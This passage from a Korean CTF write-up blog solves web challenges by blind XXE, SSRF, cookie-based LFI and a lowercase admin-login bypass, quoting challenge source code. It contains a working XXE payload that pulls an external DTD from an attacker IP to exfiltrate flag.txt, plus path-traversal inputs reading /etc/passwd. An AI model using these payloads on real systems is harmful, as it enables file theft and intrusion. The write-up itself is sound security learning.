application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:17:57 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 102</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;flag&#123;i7_1s_n0t_s0_bl1nd3721&#125;</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>그래서 <code>flag</code>, <code>flag.php</code>, <code>flag.txt</code>를 하나 하나 다 확인 해보니 <code>flag.txt</code>가 존재했고, FLAG가 읽히는 것을 볼 수 있었습니다.<br></p><blockquote><p>FLAG : flag{i7_1s_n0t_s0_bl1nd3721}</p></blockquote><hr><h2 id="Web-firstapp-496-pts"><a href="#Web-firstapp-496-pts" class="headerlink" title=" (Web) firstapp [496 pts]"></a><span style="color:#21C587"></span> (Web) firstapp [496 pts]</h2><blockquote><p>firstapp 문제는 SSRF 취약점을 이용해서 내부 서버에 있는 파일을 릭하는 문제입니다.<br></p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/1.png?raw=true"></p><p>일단 문제로 들어오면 login이 되지 않았다고 뜨는 것을 볼 수 있습니다. 여기서 <code>/login</code>이 존재할 거 같다는 생각을 할 수 있고, <code>/login</code>으로 가서 아무 아이디/비밀번호로 로그인을 하면 로그인이 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;&lt;name&gt;</span><br></pre></td></tr></table></figure><p>로그인을 하고 들어오면 위와 같이 3개의 프로필이 있는 것을 볼 수 있습니다. 프로필은 위와 같이 <code>/profile</code>에서 <code>id</code> 파라미터로 참조하게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;flag</span><br></pre></td></tr></table></figure><p>그래서 <code>id</code>의 값으로 flag를 주니 <code>flag.png</code> 파일이 하나 나오는데 처음에는 이 사진을 HxD로 열어서 확인하면 FLAG가 있을 줄 알았는데 존재하지 않았습니다. 그래서 일단 여기까지 하고 답이 없어서 Dirb를 이용해서 디렉터리 브루트 포싱을 진행했습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# dirb http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ~&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 31 08:17:05 2021</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;root&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;45.134.3.200:3000&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;css (CODE:301|SIZE:173)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;get_file (CODE:200|SIZE:18)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;images (CODE:301|SIZE:179)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;Login (CODE:200|SIZE:5661)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;logout (CODE:302|SIZE:28)</span><br><span class="line">+ http:&#x2F;&#x2F;45.134.3.200:3000&#x2F;profile (CODE:200|SIZE:24)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jan 31 08:33:29 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 7</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>dirb 툴을 돌려보니 <code>/get_file</code>이 존재하는 것을 알 수 있었고, 혹시나 <code>/get_url</code>도 있나 해보니 <code>/get_url</code>도 있었습니다. 이로서 우리는 2개의 벡터를 더 찾았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/3.png?raw=true"></p><p>제일 먼저 <code>/get_file</code>에서 시도해보았습니다. 일단 파라미터를 알지 못 하지만 file이라는 파라미타를 사용하고 있을 거 같다는 생각을 할 수 있습니다. 그래서 file 파라미터로 flag, flag.txt, flag.py, flag.php 등 등을 읽어 보려 했지만 어떤 값이 들어와도 <code>SRSLY ???</code>라는 문자열만 출력이 되었습니다.<br></p><p>하지만 아까 게싱을 해서 <code>/get_url</code>이 존재한다는 것을 알아냈습니다. 그래서 SSRF를 이용해서 FLAG가 들어있는 파일을 긁어 오기로 했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/4.png?raw=true"></p><p><code>/get_url</code>에서 일단 url이라는 파라미터로 SSRF를 시도해보니 <code>not logged in</code>이 뜨는 것을 볼 수 있습니다. 분명 로그인을 했는 데, <code>not logged in</code>이 뜨는 이유는 내부 서버로 잘 접근을 했다는 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/firstapp/5.png?raw=true"></p><p>그래서 SSRF를 이용해서 flag.* 파일을 모두 읽어 보니 flag.txt 파일이 존재하는 것을 알 수 있었고, 해당 파일 내용으로 FLAG가 있는 것을 볼 수 있습니다.<br></p><blockquote><p>FLAG : flag{h0p3_y0u_l1ked_my_@pp5613}</p></blockquote><hr><h2 id="Web-waffed-496-pts"><a href="#Web-waffed-496-pts" class="headerlink" title=" (Web) waffed [496 pts]"></a><span style="color:#21C587"></span> (Web) waffed [496 pts]</h2><blockquote><p>waffed 문제는 Cookie 변조와 LFI 취약점을 이용해서 flag를 가져오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.18.53.png?raw=true"></p><p>문제로 들어오면 <code>waffed</code> 사이트가 뜨는 것을 볼 수 있습니다. 해당 사이트는 각 코인마다 퍼센트지를 보여지는 사이트입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.19.08.png?raw=true"></p><p><code>LEARN MORE</code> 버튼을 눌러보면 현재 선택한 코인의 퍼센트지를 그래프를 보여주고 있는 것을 볼 수 있고, 현재 코인 이름은 <code>price_feed</code> 쿠키에 저장이 되어 있습니다. 그리고 다른 코인의 그래프를 볼 수 있게 설정하는 기능도 있습니다. 그럼 한 번 다른 코인으로 바꾸는 요청을 잡고, 헤더를 확인해보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">GET &#x2F;changeFeed&#x2F;DAI HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:9090</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 13:19:56 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 219</span><br><span class="line">Location: http:&#x2F;&#x2F;207.180.200.166:9090&#x2F;trade</span><br><span class="line">Connection: close</span><br><span class="line">Set-Cookie: price_feed&#x3D;REFJ; Path&#x3D;&#x2F;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href&#x3D;&quot;&#x2F;trade&quot;&gt;&#x2F;trade&lt;&#x2F;a&gt;.  If not click the link.</span><br></pre></td></tr></table></figure><p>헤더를 보면 요청을 하면 <code>DAI</code>라는 코인으로 바꾸고, 바로 그래프가 있는 곳으로 리다이렉션 시켜주는 것을 볼 수 있습니다. 여기서 중요한 부분은 응답에 <code>Set-Cookie</code> 헤더를 보면 <code>price_feed</code>의 값으로 <code>REFJ</code>가 들어있는 것을 볼 수 있습니다. <code>REFJ</code>는 우리가 바꾼 코인의 이름(DAI)이 b64로 인코딩되어 들어간 것 입니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.20.31.png?raw=true"></p><p>즉, 서버에서는 b64로 해당 쿠키 값을 디코딩해서 사용한다는 것 입니다. 그래서 일단 SQL Injection을 시도해보기 위해서 페이로드를 b64 인코딩을 해줘서 보내주니 <code>WOOPS</code>만 뜨고 아무 일도 일어나지 않았습니다.<br></p><p>하지만 여기서 <code>price_feed</code> 값으로 코인 이름을 바꿔서 코인에 대한 파일을 조회하는 거라면?이라고 생각을 했습니다. 그 이유는 코인마다 그래프도 다 다르기 때문에 모든 데이터를 각 코인의 파일로 관리하고 있을 거라는 생각이 들었습니다. 그래서 바로 LFI를 진행했고, 일단 <code>/etc/passwd</code>를 긁어오기를 시도했습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.20.31.png?raw=true"></p><p>그래서 <code>/etc/passwd</code>를 b64로 인코딩해서 쿠키 값으로 설정하고, 새로 고침을 해주니 SQL Injection과 마찬가지로 <code>WOOPS</code>라고 뜨는 것을 볼 수 있습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.21.54.png?raw=true"></p><p>하지만 현재 경로에서 해당 파일이 없어 <code>WOOPS</code>가 출력되는 걸 수도 있기 때문에 상위로 한 번 한 번 올라가며 모두 시도 해보았는데, 총 4번 올라가서 <code>../../../../etc/passwd</code>를 읽어보니 <code>WOOPS</code>가 뜨지 않고, 그래프가 있는 창으로 리다이렉션이 되었습니다. 그런데 이상한 점은 그래프는 있는데 그래프에 데이터가 존재하지 않았습니다.<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.22.06.png?raw=true"></p><p>그래서 그래프의 소스 코드를 확인해보니 그래프를 만드는 JS 코드가 있었고, 그래프의 data 값으로 <code>/etc/passwd</code>의 값이 들어가 있는 것을 볼 수 있었습니다. 예상대로 각 코인의 데이터를 파일로 관리하고 있었습니다.</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/0x41414141/waffed/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-31%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%2010.23.01.png?raw=true"></p><p>앞에 모든 문제도 FLAG는 <code>flag.txt</code>에 있었기 때문에 이번 문제도 상위로 4번 올라가 <code>../../../../flag.txt</code>를 읽어주니 그래프의 data에 FLAG가 있는 것을 볼 수 있었습니다.<br></p><blockquote><p>flag{w@fs_r3@lly_d0_Suck8245}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> XXE </tag>
            
            <tag> LFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dreamhack CTF Season 1 Round #4 Write Up</title>
      <link href="2021/01/30/2021-01-30-dctf/"/>
      <url>2021/01/30/2021-01-30-dctf/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/dctf10th.png?raw=true"></p><p>2021년 1월 30일 오전 9시부터 오후 6시까지 Theory에서 CTF를 주최하였습니다. 이번 대회는 전체적으로 난이도가 낮아 운이 좋게 10등을 할 수 있었고, 풀면서 그나마 공을 들였던 <code>WEB_2021A_Medium</code>라는 문제의 Write Up을 작성해보겠습니다.<br></p><h2 id="Web-WEB-2021A-Medium-936-pts"><a href="#Web-WEB-2021A-Medium-936-pts" class="headerlink" title="(Web) WEB_2021A_Medium [936 pts]"></a>(Web) WEB_2021A_Medium [936 pts]</h2><blockquote><p>WEB_2021A_Medium 문제는 관리자 계정으로 로그인하고, 관리자 계정을 활성화 한 후에 FLAG를 읽는 문제입니다.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>)</span><br><span class="line">    myusr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">    <span class="keyword">if</span> myusr.userid == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> myusr.auth:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=FLAG)</span><br><span class="line">    <span class="keyword">return</span> alert(<span class="string">&quot;No Flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/flag</code>를 보면 현재 로그인된 사용자가 <code>admin</code>이고, 계정이 활성화가 되어 있으면 <code>FLAG</code>를 보여주는 것을 볼 수 있습니다. 그럼 관리자 계정을 획득하고, 계정을 활성화 시켜보겠습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    userid = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    email = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    auth = db.Column(db.Boolean())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, userid, password, email</span>):</span></span><br><span class="line">        self.userid = userid</span><br><span class="line">        self.password = password</span><br><span class="line">        self.email = email</span><br><span class="line">        self.auth = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_json</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;userid&quot;</span>: self.userid.lower(),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: self.password.lower(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: self.email.lower(),</span><br><span class="line">            <span class="string">&quot;auth&quot;</span>: self.auth,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/signin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Already Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;signin.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        userid = request.form.get(<span class="string">&quot;userid&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        userpw = request.form.get(<span class="string">&quot;userpw&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        usr = User.query.filter_by(</span><br><span class="line">            userid=userid, password=hashlib.md5(userpw.encode()).hexdigest()</span><br><span class="line">        ).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(usr, <span class="string">&quot;userid&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Check userid or userpw&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>로그인 로직을 보면 userid, userpw 값을 받아와서 로그인하는 것을 볼 수 있습니다. 여기서 session을 관리 할 때 to_json 함수를 이용해서 사용자 정보를 넣어주는 것을 볼 수 있습니다. to_json 함수를 보면 userid의 값을 lower 함수를 이용해 소문자로 만들어 세션으로 사용하는 것을 볼 수 있습니다. 즉, <code>ADMIN</code>이라는 사용자를 가입해서 로그인을 해주면 to_json 함수에 의해서 <code>admin</code>으로 로그인이 됩니다. 이를 통해 관리자 아이디는 쉽게 획득했습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, email</span>):</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">        self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self</span>):</span></span><br><span class="line">        setcount = conn.get(self.email)</span><br><span class="line">        <span class="keyword">if</span> setcount:</span><br><span class="line">            setcount = <span class="built_in">int</span>(setcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> setcount &lt; <span class="number">5</span>:</span><br><span class="line">            self.random_key = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">111111</span>, <span class="number">999999</span>):04d&#125;</span>&quot;</span></span><br><span class="line">            conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.email, setcount)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        getcount = conn.get(self.getcount_key)</span><br><span class="line">        <span class="keyword">if</span> getcount:</span><br><span class="line">            getcount = <span class="built_in">int</span>(getcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            getcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> getcount &lt; <span class="number">5</span>:</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, getcount)</span><br><span class="line">            <span class="keyword">return</span> conn.get(self.emailauth_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> auth.<span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_mail(email, auth.random_key):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">f&quot;Send Email To <span class="subst">&#123;email&#125;</span>&quot;</span>, <span class="string">&quot;/email_verify_chk&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Send Email Err&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify_chk&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify_chk</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify_chk.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        authcode = auth.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authcode:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth or No Code Generated&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> code == authcode:</span><br><span class="line">                usr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">                usr.auth = <span class="literal">True</span></span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">                <span class="keyword">return</span> alert(<span 